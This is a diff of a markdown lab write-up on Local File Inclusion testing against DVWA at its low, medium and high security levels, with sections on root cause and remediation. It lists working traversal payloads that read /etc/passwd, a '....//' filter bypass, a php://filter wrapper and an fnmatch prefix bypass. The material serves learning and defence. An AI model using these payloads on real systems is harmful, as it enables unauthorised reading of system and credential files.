@@ -1,151 +1,103 @@
-# File Inclusion (LFI)
+# File Inclusion (Local File Inclusion - LFI)
 
 ## Overview
 
-Local File Inclusion (LFI) occurs when an application allows user-controlled input to determine which file is loaded. An attacker may access sensitive files or, in some cases, execute malicious code.
+File Inclusion is a vulnerability that allows attackers to include unintended files through user-controlled input. This may lead to disclosure of sensitive files or Remote Code Execution (RCE) when combined with other vulnerabilities.
 
----
+> **Note:** Remote File Inclusion (RFI) was not tested because `allow_url_include` was disabled in the PHP configuration.
+
 
 ## Security Level Comparison
 
-| Level      | Protection               | Result                                                                   |
-| ---------- | ------------------------ | ------------------------------------------------------------------------ |
-| **Low**    | No path validation       | Arbitrary files can be included.                                         |
-| **Medium** | Basic path filtering     | Common traversal sequences are restricted, but bypasses remain possible. |
-| **High**   | Improved path validation | Unauthorized file inclusion becomes significantly more difficult.        |
+| Feature | Low | Medium | High |
+|---------|------|---------|------|
+| Protection | None | Basic directory traversal filtering | Whitelist using `fnmatch()` |
+| Successful Bypass | Directory Traversal | Filter Bypass (`....//`) | Wildcard (`file*`) Bypass |
 
----
 
-## Low Security
+## Low Security Level
 
-### Test Procedure
+### Attack Flow
 
-1. Identify the parameter responsible for loading files.
-2. Replace the expected value with file traversal sequences.
-3. Verify whether local system files can be accessed.
+| Payload | Objective | Result |
+|---------|-----------|--------|
+| `?page=file1.php` | Verify normal functionality | File loaded successfully. |
+| `?page=../../../../../../etc/passwd` | Read sensitive system file | ✅ `/etc/passwd` disclosed. |
+| `?page=../../../../../../etc/hosts` | Read another system file | ✅ File disclosed. |
 
-### Input Tested
+### Observation
 
-```text id="lq91bz"
-../../../../etc/passwd
-```
-
-```text id="6gz94l"
-../../../../../../windows/win.ini
-```
+The application directly includes user-controlled input without validation, allowing arbitrary local files to be accessed.
 
 ### Evidence
 
-**Modified Request**
-
 <p align="center">
-  <img src="../screenshots/File_inclusion/01_low_input.png" width="100%">
+<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/tree/main/Screenshots/File_inclusion/01_low_result.png" width="100%">
 </p>
-
-**Sensitive File Retrieved**
-
-<p align="center">
-  <img src="../screenshots/File_inclusion/02_low_result.png" width="100%">
-</p>
-
-### Finding
-
-The application accepted user-controlled file paths and returned sensitive local files without validation.
 
 ---
 
-## Medium Security
+## Medium Security Level
 
-### Test Procedure
+### Attack Flow
 
-1. Repeat the previous traversal attempts.
-2. Identify restricted characters or filtered paths.
-3. Test alternative traversal techniques.
-4. Verify whether local files remain accessible.
+| Payload | Objective | Result |
+|---------|-----------|--------|
+| `?page=../../../../../../etc/passwd` | Test previous payload | ❌ Blocked |
+| `?page=....//....//....//....//....//....//etc/passwd` | Bypass traversal filter | ✅ `/etc/passwd` disclosed. |
+| `?page=php://filter/read=convert.base64-encode/resource=file1.php` | Test PHP stream wrapper | *(Test if supported in your environment.)* |
 
-### Input Tested
+### Observation
 
-```text id="wy9whv"
-(Add successful path)
-```
-
-```text id="4zhzkj"
-(Add alternative path)
-```
+The application filters directory traversal patterns only once. Using `....//` bypasses the filter and restores directory traversal.
 
 ### Evidence
 
-**Modified Request**
-
 <p align="center">
-  <img src="../screenshots/File_inclusion/03_medium_input.png" width="100%">
+<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/tree/main/Screenshots/File_inclusion/02_medium_result.png" width="100%">
 </p>
-
-**Application Response**
-
-<p align="center">
-  <img src="../screenshots/File_inclusion/04_medium_result.png" width="100%">
-</p>
-
-### Finding
-
-Basic path filtering blocked common traversal attempts, but alternative techniques successfully bypassed the implemented restrictions.
 
 ---
 
-## High Security
+## High Security Level
 
-### Test Procedure
+### Attack Flow
 
-1. Evaluate the implemented path validation.
-2. Test known traversal bypass techniques.
-3. Verify whether unauthorized files can still be accessed.
+| Payload | Objective | Result |
+|---------|-----------|--------|
+| `?page=../../../../../../etc/passwd` | Test previous payload | ❌ Blocked |
+| `?page=file../../../../../../etc/passwd` | Test wildcard bypass | ❌ Blocked |
+| `?page=file/../../../../../../etc/passwd` | Test alternate traversal | ❌ Blocked |
+| `?page=file1.php../../../../../../etc/passwd` | Bypass `fnmatch("file*")` validation | ✅ `/etc/passwd` disclosed. |
 
-### Input Tested
+### Observation
 
-```text id="fh1tvn"
-(Add successful path if applicable)
-```
-
-```text id="ljlwmk"
-(Add alternative path)
-```
+The application restricts filenames using `fnmatch("file*")`, which only verifies that the input starts with `file`. By prefixing the payload with `file1.php`, the validation is bypassed while directory traversal remains possible.
 
 ### Evidence
 
-**Modified Request**
-
 <p align="center">
-  <img src="../screenshots/File_inclusion/05_high_input.png" width="100%">
+<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/tree/main/Screenshots/File_inclusion/03_high_result.png" width="100%">
 </p>
-
-**Application Response**
-
-<p align="center">
-  <img src="../screenshots/File_inclusion/06_high_result.png" width="100%">
-</p>
-
-### Finding
-
-Improved path validation significantly reduced the success of directory traversal and file inclusion attempts.
 
 ---
+
+## Root Cause
+
+The application includes files using user-controlled input without securely validating the requested path. Blacklist filtering and wildcard matching are insufficient to prevent Local File Inclusion.
+
 
 ## Overall Impact
 
-Successful exploitation may allow an attacker to:
-
-* Read sensitive system or application files.
-* Expose configuration files containing credentials.
-* Gather information about the server environment.
-* Escalate attacks when combined with other vulnerabilities.
-
----
+- Read sensitive server files.
+- Disclose application source code and configuration files.
+- Leak credentials or system information.
+- Achieve Remote Code Execution (RCE) when combined with another vulnerability (e.g., File Upload).
 
 ## Remediation
 
-* Never allow user input to determine file paths directly.
-* Restrict access to approved files using an allowlist.
-* Validate and normalize file paths before use.
-* Disable unnecessary file inclusion features and restrict file permissions.
-
+- Avoid including files directly from user input.
+- Use a strict allowlist of permitted files.
+- Validate canonical file paths before inclusion.
+- Disable unnecessary PHP stream wrappers.
+- Restrict file access using least-privilege permissions.
